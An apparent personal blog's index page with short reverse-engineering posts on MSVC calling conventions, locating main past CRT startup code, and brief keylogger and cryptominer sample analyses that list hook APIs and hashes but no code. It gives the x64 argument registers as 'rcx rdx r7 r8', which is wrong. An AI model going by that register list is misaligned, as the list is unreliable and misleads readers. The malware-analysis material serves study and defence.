<h3 id="vectorcall"><a href="#vectorcall" class="headerlink" title="__vectorcall"></a>__vectorcall</h3><p>The <strong><code>__vectorcall</code></strong> calling convention specifies that arguments to functions are to be passed in registers. <strong><code>__vectorcall</code></strong> uses more registers for arguments than <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/fastcall?view=msvc-170"><code>__fastcall</code></a> or the default <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention</a>(rcx rdx r7 r8 [rsp+[size of arg]) use. The <strong><code>__vectorcall</code></strong> calling convention is only supported in native code on x86 and x64 processors that<u>  include Streaming SIMD Extensions 2 (SSE2) and above.</u> Use <strong><code>__vectorcall</code></strong> to speed functions that pass several floating-point or SIMD vector arguments and perform operations that take advantage of the arguments loaded in registers. The following list shows the features that are common to the x86 and x64 implementations of <strong><code>__vectorcall</code></strong>. The differences are explained later in this article.</p>
<blockquote>
<p>to be continue one day</p>
</blockquote>
<p>Reference:</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">https://docs.microsoft.com/en-us/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170</a></p>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-07</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 834 words, 2 min 46 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/04/oep-tricks/">oep_tricks</a></h3></div><div class="post-content"><div class="card"><p><h1 id="OEP-tricks"><a href="#OEP-tricks" class="headerlink" title="OEP tricks"></a>OEP tricks</h1><h2 id="intro"><a href="#intro" class="headerlink" title="intro"></a>intro</h2><p>Why is the PE Entry Point Not the same as Main Understanding <code>__security__init__cookie</code>and<code>scrt_common_main_seh</code></p>
<p>在第一次学习如何对 Windows 二进制文件进行逆向工程时，尤其是在使用调试器时，这是一个需要理解的重要概念。 当调试器在 PE 入口点上中断时，通常会让人感到困惑，只是为了找到一些与二进制文件的主要功能无关的代码。 此代码通常称为<code>boilerplate</code>代码，由 MSVC 编译器自动插入。 这对我们识别代码和方向有很大帮助。</p>
<h3 id="MSVC-console-Application-Entry-point"><a href="#MSVC-console-Application-Entry-point" class="headerlink" title="MSVC console Application Entry point"></a>MSVC console Application Entry point</h3><p>The Entry Point on an MSVC console application servers two purples .</p>
<ul>
<li>calls the <code>__security__init_cookie</code> function </li>
<li>jumps to the <code>__scrt_common_main_seh</code>thunk<ul>
<li>The __scrt_common_main_seh thunk then performs some setup for the binary including some structured exception handler (SEH) setup and then calls  main.</li>
</ul>
</li>
</ul>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403215142052.png" alt="image-20220403215142052"></p>
<h3 id="security-init-cookie"><a href="#security-init-cookie" class="headerlink" title="__security_init_cookie"></a>__security_init_cookie</h3><blockquote>
<p>The purpose of this cookie is best described by <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/security-init-cookie?view=msvc-170">MSDN</a></p>
<p>全局安全 cookie 用于在使用 &#x2F;GS（缓冲区安全检查）编译的代码和使用异常处理的代码中进行缓冲区溢出保护。</p>
<p>在进入受溢出保护的函数时，cookie 被放入堆栈，而在退出时，堆栈上的值与全局 cookie 进行比较。 它们之间的任何差异都表明发生了缓冲区溢出并导致程序立即终止。</p>
</blockquote>
<p>Normally, <strong><code>__security_init_cookie</code></strong> is called by the CRT when it’s initialized. If you bypass CRT initialization—for example, if you use <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/build/reference/entry-entry-point-symbol?view=msvc-170"><code>/ENTRY</code></a> to specify an entry-point—then you must call </p>
<p><strong><code>__security_init_cookie</code></strong> yourself. If <strong><code>__security_init_cookie</code></strong> isn’t called, the global security cookie is set to a default value and  buffer overrun protection is compromised. Because an attacker can  exploit this default cookie value to defeat the buffer overrun checks,  we recommend that you always call </p>
<p><strong><code>__security_init_cookie</code></strong> when you define your own entry point.</p>
<blockquote>
<p>we can use the opcode <code>48 89 5C 24 20 55 48 8B EC 48 83 EC 20</code> to find the <code>__security_init_cookie</code></p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403230636976.png" alt="image-20220403230636976"></p>
</blockquote>
<p>The call to <strong><code>__security_init_cookie</code></strong> must be made before any overrun-protected function is entered; otherwise a  spurious buffer overrun will be detected. For more information, see <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/cpp/error-messages/tool-errors/c-runtime-error-r6035?view=msvc-170">C Runtime Error R6035</a>.</p>
<h3 id="scrt-common-main-seh"><a href="#scrt-common-main-seh" class="headerlink" title="__scrt_common_main_seh"></a>__scrt_common_main_seh</h3><p>Looking at this code without labels (for example in x64dbg) it can be confusing to identify where main is. Luckily MSVC console applications all have the same main function prototype.</p>
<blockquote>
<p>*main(int argc, const char **argv, const char *<em>envp)</em></p>
</blockquote>
<p>This function prototype can be used to identify the call to main in __scrt_common_main_seh, simply by looking for the three arguments that are passed to main: <em>argc</em>, <em>argv</em>, <em>envp</em>.</p>
<ul>
<li><p>In 64-bit binaries these arguments are compiled into a series of three <em>mov</em> instructions moving the arguments into the registers <code>RCX, RDX, R8</code></p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225145892.png" alt="image-20220403225145892"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4C 8B C7                mov     r8, rdi         ; envp</span><br><span class="line">48 8B D3                mov     rdx, rbx        ; argv</span><br><span class="line">8B 08                   mov     ecx, [rax]      ; argc</span><br></pre></td></tr></table></figure>

</li>
<li><p>In 32-bit binaries these arguments are compiled into a series of three <em>push</em> instructions pushing the arguments onto the stack.</p>
<p> <img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220403225150632.png" alt="image-20220403225150632"></p>
</li>
</ul>
<blockquote>
<p>！！！！！！These patterns can be relied on to identify main. ！！！！！！！</p>
</blockquote>
</p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-04</span><i class="fa fa-tag"></i><a class="tag" href="/tags/msvc/" title="msvc">msvc </a><span class="leancloud_visitors"></span><span>About 637 words, 2 min 7 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/04/01/keylog/">keylog</a></h3></div><div class="post-content"><div class="card"><p><blockquote>
<p>样本来源：lab03-03</p>
<p>md5: e2bf42217a67e46433da8b6f4507219e</p>
</blockquote>
<p>动态解密资源里的PE后得到了keylog的代码部分。这里不写。</p>
<h2 id="keylog-Analysis"><a href="#keylog-Analysis" class="headerlink" title="keylog Analysis"></a>keylog Analysis</h2><p>通过伪代码我可以很清楚得看到keylog的几步</p>
<ul>
<li>FindWindowA</li>
<li>ShowWindow</li>
<li>GetModuleHandleA</li>
<li>SetWindowHookExA</li>
<li>unhookWindowsHookEx</li>
</ul></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-04-01</span><i class="fa fa-tag"></i><span class="leancloud_visitors"></span><span>About 952 words, 3 min 10 sec  read</span></div></div></div></div><div class="post animated fadeInDown"><div class="post-title"><h3><a href="/2022/03/29/mining-sh-analysis/">mining-sh-analysis</a></h3></div><div class="post-content"><div class="card"><p><h1 id="mining-Virus-Analysis"><a href="#mining-Virus-Analysis" class="headerlink" title="mining Virus Analysis"></a>mining Virus Analysis</h1><blockquote>
<p>md5: eeb8f9ae60c73f84ff85bbeab9c0b6ee</p>
<p>filename: .systemd-private-nU9WagjQ8BenWPXt0ovE12uD8jBItv6</p>
</blockquote></p></div></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-03-29</span><i class="fa fa-tag"></i><a class="tag" href="/tags/linux/" title="linux">linux </a><span class="leancloud_visitors"></span><span>About 1108 words, 3 min 41 sec  read</span></div></div></div></div><div class="pagination"><ul class="clearfix"><li class="next pagbuttons"><a class="btn" role="navigation" href="/page/2/">Next</a></li></ul></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script>(function(window){var INSIGHT_CONFIG={TRANSLATION:{POSTS:"Posts",PAGES:"Pages",CATEGORIES:"Categories",TAGS:"Tags",UNTITLED:"(Untitled)",},CONTENT_URL:"/content.json",};window.INSIGHT_CONFIG=INSIGHT_CONFIG})(window);</script><script src="/js/insight.js" defer></script><div class="searchbox ins-search"><div class="searchbox-container ins-search-container"><div class="searchbox-input-wrapper"><input class="searchbox-input ins-search-input" type="text" placeholder="Search..."><span class="searchbox-close"><a class="fa fa-times-circle" onclick="closeWindow();"></a></span></div><div class="searchbox-result-wrapper ins-section-wrapper"><div class="ins-section-container"><p>Seraching...</p></div></div></div></div></body></html>